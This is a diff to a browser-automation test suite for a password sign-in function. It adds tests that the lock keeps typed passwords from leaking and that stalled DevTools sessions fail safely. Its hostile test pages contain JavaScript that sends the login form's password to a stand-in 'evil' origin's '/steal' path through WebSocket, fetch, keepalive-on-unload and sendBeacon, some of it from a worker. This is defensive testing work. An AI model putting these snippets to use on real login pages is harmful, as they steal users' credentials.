@@ -20,6 +20,9 @@ type FallbackOptions = Parameters<Route["fallback"]>[0];
 /** The outcome of a sign-in that typed the stand-in and sent the form, or ran the page's submit handler that held it back. */
 const REACHED_SEND = /^(?:The login form was not sent: the page held it back|The page tried to send .+|The password could not be cleared .+)?$/u;
 
+/** What a test page logs once its form's submit handler runs. */
+const SUBMITTED = "reached: submit handler";
+
 /** A command answer that never comes. */
 const NEVER = new Promise<never>(() => {
     // Never settles.
@@ -112,6 +115,8 @@ describe(signIn, () => {
         datagrams.push(message.toString("latin1"));
     });
     let turn = "";
+    /** What the tab's pages logged to the console. */
+    const logged: string[] = [];
     let pageLoads = 0;
 
     beforeAll(async () => {
@@ -185,6 +190,10 @@ describe(signIn, () => {
     beforeEach(async () => {
         context = await browser.newContext();
         page = await context.newPage();
+        logged.length = 0;
+        page.on("console", (message) => {
+            logged.push(message.text());
+        });
         evil.hits.length = 0;
         login.hits.length = 0;
         fixture.headers = {};
@@ -867,9 +876,21 @@ describe(signIn, () => {
     /** A worker's script that sends what it is handed to the other site on a WebSocket and by POST. */
     const exfiltrate = (): string =>
         `const send = (data) => { new WebSocket("${evil.origin.replace("http", "ws")}/steal?" + data); fetch("${evil.origin}/steal", { body: data, method: "POST", mode: "no-cors" }); };`;
+
+    /**
+     * Kept by an unload handler as it sends, when the password field holds what was typed: it got to the send. In the
+     * site's storage, as what an unloading page logs is not reported.
+     */
+    const unloading = `if (document.forms[0].pw.value) localStorage.setItem("reached", "send on unload");`;
+    const sentOnUnload = async (): Promise<boolean> => {
+        const { origins } = await context.storageState();
+
+        return origins.some(({ localStorage }) => localStorage.some(({ name }) => name === "reached"));
+    };
+    /** A login form whose submit handler logs `SUBMITTED`, holds the form back and runs `body` with the field's value as `pw`. */
     const onSubmit = (body: string, before = ""): string =>
         loginForm(
-            `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const pw = document.forms[0].pw.value; ${body} });`,
+            `${before} document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); console.log("${SUBMITTED}"); const pw = document.forms[0].pw.value; ${body} });`,
         );
     /** Rules that prefetch every link in the document as soon as it is there. */
     const EVERY_LINK = `{"prefetch":[{"eagerness":"immediate","source":"document"}]}`;
@@ -921,7 +942,8 @@ describe(signIn, () => {
             "a worker started with the page",
             () => {
                 return {
-                    page: onSubmit("worker.postMessage(pw);", `const worker = new Worker("/worker.js");`),
+                    // Started as the page loads, where the lock refuses it: the page goes on without.
+                    page: onSubmit("worker?.postMessage(pw);", `let worker; try { worker = new Worker("/worker.js"); } catch {}`),
                     worker: `${exfiltrate()} onmessage = (event) => send(event.data);`,
                 };
             },
@@ -964,7 +986,7 @@ describe(signIn, () => {
             () => {
                 return {
                     page: loginForm(
-                        `addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { keepalive: true, mode: "no-cors" }));`,
+                        `addEventListener("pagehide", () => { ${unloading} fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { keepalive: true, mode: "no-cors" }); });`,
                     ),
                 };
             },
@@ -974,7 +996,7 @@ describe(signIn, () => {
             () => {
                 return {
                     page: loginForm(
-                        `let reads = 0; addEventListener("pagehide", () => fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { get keepalive() { reads += 1; return reads > 1; }, mode: "no-cors" }));`,
+                        `let reads = 0; addEventListener("pagehide", () => { ${unloading} fetch("${evil.origin}/steal?" + document.forms[0].pw.value, { get keepalive() { reads += 1; return reads > 1; }, mode: "no-cors" }); });`,
                     ),
                 };
             },
@@ -982,7 +1004,11 @@ describe(signIn, () => {
         [
             "a beacon as the page unloads",
             () => {
-                return { page: loginForm(`addEventListener("pagehide", () => navigator.sendBeacon("${evil.origin}/steal", document.forms[0].pw.value));`) };
+                return {
+                    page: loginForm(
+                        `addEventListener("pagehide", () => { ${unloading} navigator.sendBeacon("${evil.origin}/steal", document.forms[0].pw.value); });`,
+                    ),
+                };
             },
         ],
         [
@@ -1069,6 +1095,7 @@ describe(signIn, () => {
 
         // Each case gets as far as the stand-in typed and the form sent, unless it names the refusal that stops it first.
         expect(result.success ? "" : result.error).toMatch(refusal ?? REACHED_SEND);
+        expect(logged.includes(SUBMITTED) || (await sentOnUnload())).toBe(refusal === undefined);
         expect(evil.hits).toStrictEqual([]);
     });
 
@@ -1105,6 +1132,7 @@ describe(signIn, () => {
         const result = await run();
 
         expect(result.success ? "" : result.error).toMatch(REACHED_SEND);
+        expect(logged).toContain(SUBMITTED);
         expect(datagrams).toStrictEqual([]);
     });
 
@@ -1312,6 +1340,81 @@ describe(signIn, () => {
         expect(result).toMatchObject({ submitted: false, success: false });
         expect(page.url()).toBe("about:blank");
         await expect(page.evaluate(() => Boolean(new RTCPeerConnection()))).resolves.toBe(true);
+        expect(sessionPosts()).toStrictEqual([]);
+    });
+
+    /** Has every command `method` of a tab's DevTools session for which `isPicked` says so (told the session's first command) never answer. */
+    const stallOn = (method: string, isPicked: (first: string) => boolean): void => {
+        const { newCDPSession } = context;
+
+        context.newCDPSession = async (...args) => {
+            const session = await newCDPSession.apply(context, args);
+            const { send } = session;
+            let first: string | undefined;
+
+            session.send = (async (sent: string, params?: Parameters<typeof send>[1]) => {
+                first ??= sent;
+
+                return sent === method && isPicked(first) ? NEVER : send.call(session, sent as never, params as never);
+            }) as typeof send;
+
+            return session;
+        };
+    };
+
+    it("types no password when the page's speculation rules cannot be read in time", async () => {
+        // The lock's own session of the tab is the one that starts with its target's info.
+        stallOn("Page.getFrameTree", (first) => first === "Target.getTargetInfo");
+        fixture.page = loginForm();
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("did not answer in time"), submitted: false, success: false });
+        expect(await passwordLeft()).toBe(false);
+        expect(sessionPosts()).toStrictEqual([]);
+    });
+
+    it("closes the session when the guard for the send is not set up in time", async () => {
+        // The guard's session is the one that starts by pausing every answer.
+        stallOn("Fetch.enable", (first) => first === "Fetch.enable");
+        fixture.page = loginForm();
+
+        const result = await run();
+
+        expect(result).toMatchObject({
+            error: expect.stringContaining("locked down for the send in time"),
+            sessionClosed: true,
+            submitted: false,
+            success: false,
+        });
+        expect(page.isClosed()).toBe(true);
+        expect(sessionPosts()).toStrictEqual([]);
+    });
+
+    it("types nothing when the session that read the served page does not let go of it", async () => {
+        const { newCDPSession } = context;
+
+        // The session that reads the served page is the one that turns the HTTP cache off: letting go of it never ends.
+        context.newCDPSession = async (...args) => {
+            const session = await newCDPSession.apply(context, args);
+            const { send } = session;
+
+            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
+                if (method === "Network.setCacheDisabled") {
+                    session.detach = async () => NEVER;
+                }
+
+                return send.call(session, method as never, params as never);
+            }) as typeof send;
+
+            return session;
+        };
+        fixture.page = loginForm();
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("did not let go of the login page"), submitted: false, success: false });
+        expect(await passwordLeft()).toBe(false);
         expect(sessionPosts()).toStrictEqual([]);
     });
 
